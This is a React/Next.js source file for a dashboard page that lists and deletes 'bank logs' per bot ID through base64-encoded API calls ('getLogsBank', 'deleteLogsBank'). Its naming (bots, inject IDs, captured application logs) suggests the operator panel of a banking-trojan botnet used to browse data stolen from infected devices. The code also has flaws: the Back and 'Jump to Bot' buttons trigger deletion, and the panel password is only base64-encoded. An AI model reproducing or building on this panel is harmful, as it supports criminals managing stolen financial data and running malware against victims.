import React, { useCallback, useRef, useMemo, useReducer, useState, useEffect } from 'react';
import Head from 'next/head';
import { useRouter } from 'next/router'
import { Box, Button, Select, InputLabel, MenuItem, ListItemIcon, InputAdornment, OutlinedInput, Container, Stack, Card, CardHeader, CardActions, Divider, CardContent, SvgIcon, Grid, FormControlLabel, Typography, Checkbox } from '@mui/material';
import { useSelection } from 'src/hooks/use-selection';
import { Layout as DashboardLayout } from 'src/layouts/dashboard/layout';
import { CustomersTable } from 'src/sections/logs-section/logs-table';
import { applyPagination } from 'src/utils/apply-pagination';
import SettingsContext from '../../settings';
import $ from 'jquery';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faArrowLeft, faBackspace, faRobot, faTrashCan } from '@fortawesome/free-solid-svg-icons';
import countryData from '../../sections/customer/countrydata.json';
import Link from 'next/link';


const now = new Date();


function replaceNthCharWith(str, newChar, index) {
  if (index >= str.length) {
    return str;
  } else {
    return str.substr(0, index) + newChar + str.substr(index + 1);
  }
}

function searchStringInArray(arr, str) {
  for (let i = 0; i < arr.length; i++) {
    for (let key in arr[i]) {
      if (arr[i][key].toString().includes(str)) {
        return true;
      }
    }
  }
  return false;
}

function checkNthChar(str, n, char) {
  if (str.charAt(n - 1) === char) {
    return true;
  } else {
    return false;
  }
}

const useCustomerIds = (customers) => {
  return useMemo(
    () => {
      return customers.map((customer) => customer.id);
    },
    [customers]
  );
};

const Page = () => {

  let data = [];
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(100);
  const [customers, setCustomers] = useState(applyPagination(data, page, rowsPerPage));
  const customersIds = useCustomerIds(customers);
  const customersSelection = useSelection(customersIds);
  const [showOptions, setShowOptions] = useState(false);
  const [showFilterCountry, setShowFilterCountry] = useState(false);

  const [selectedCountry, setselectedCountry] = useState('');
  const countRef = useRef(0);

  const router = useRouter()
  const { idbot } = router.query

  const menuPaperStyle = {
    maxHeight: 200,
    '& ul': {
      padding: 0,
      margin: 0,
    },
  };

  useEffect(() => {
    newCustomers()

  }, []);

  const deletebots = async () => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
         'params': new Buffer('{"request":"deleteLogsBank","idinj":"' + SettingsContext.SelectedBots.join(",") + '","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });

    request.done(function(msg) {
      newCustomers()
    }.bind(this));
  }

  const newCustomers = async () => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params':  new Buffer ('{"request":"getLogsBank","tag":"test","idbot":"' + idbot + '","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });

    request.done(function(msg) {
      let response = (JSON.parse(msg))
      let responsedata = response.logsBanks
      var data = [];

      responsedata.forEach((stats) => {
        const { idinj, idbot, application, comment, logs } = stats;
        var logsfinal = JSON.parse(atob(logs))
        
        data.push({  idinj, idbot, application, comment, logs: logsfinal});
      });

      setCustomers(applyPagination(data, SettingsContext.CurrentPageLogs, SettingsContext.RowsPerPageLogs))
      SettingsContext.CountLogs = data.length
      
      
    }.bind(this));
    
  };

  const handlePageChange = useCallback(
    (event, value) => {
      setPage(value);
      SettingsContext.CurrentPageLogs = value
      newCustomers()
    },
    []
  );



  const handleRowsPerPageChange = useCallback(
    (event) => {
      setRowsPerPage(event.target.value);
      SettingsContext.RowsPerPageLogs = event.target.value
      newCustomers()
    },
    []
  );

      return (
        <>
          <Head>
            <title>
              Logs
            </title>
          </Head>
          <Box
            component="main"
            sx={{
              flexGrow: 1,
              py: 8
            }}
          >
            <Container maxWidth="xl">
              <Stack spacing={3}>
                <div>
                <Link href="/logs-page" style={{ textDecoration: 'none' }}>
                    <Button
                      onClick={deletebots}
                      startIcon={(
                        <FontAwesomeIcon icon={faArrowLeft} />
                      )}
                      variant="contained"
                    >
                      Back
                    </Button>
                </Link>
                <Link href={"/bots?botid=" + idbot} style={{ marginLeft:20 ,textDecoration: 'none' }}>
                    <Button
                      onClick={deletebots}
                      startIcon={(
                        <FontAwesomeIcon icon={faRobot} />
                      )}
                      variant="contained"
                    >
                      Jump to Bot
                    </Button>
                </Link>
                </div>
                <Stack
                  direction="row"
                  justifyContent="space-between"
                  spacing={4}
                >
                  <Stack spacing={1}>
                    <Typography variant="h4">
                      Logs for bot {idbot}
                    </Typography>
                    <Stack
                      alignItems="center"
                      direction="row"
                      spacing={1}
                    >
                    </Stack>
                  </Stack>
                  <div>
                    <Button
                      onClick={deletebots}
                      startIcon={(
                        <FontAwesomeIcon icon={faTrashCan} />
                      )}
                      variant="contained"
                    >
                      Delete Selected
                    </Button>
                  </div>
                </Stack>
                <CustomersTable
                  count={SettingsContext.CountLogs}
                  items={customers}
                  onDeselectAll={customersSelection.handleDeselectAll}
                  onDeselectOne={customersSelection.handleDeselectOne}
                  onPageChange={handlePageChange}
                  onRowsPerPageChange={handleRowsPerPageChange}
                  onSelectAll={customersSelection.handleSelectAll}
                  onSelectOne={customersSelection.handleSelectOne}
                  page={page}
                  rowsPerPage={rowsPerPage}
                  selected={customersSelection.selected}
                />
              </Stack>
            </Container>
          </Box>
        </>
      );
    }

Page.getLayout = (page) => (
  <DashboardLayout>
    {page}
  </DashboardLayout>
);

export default Page;
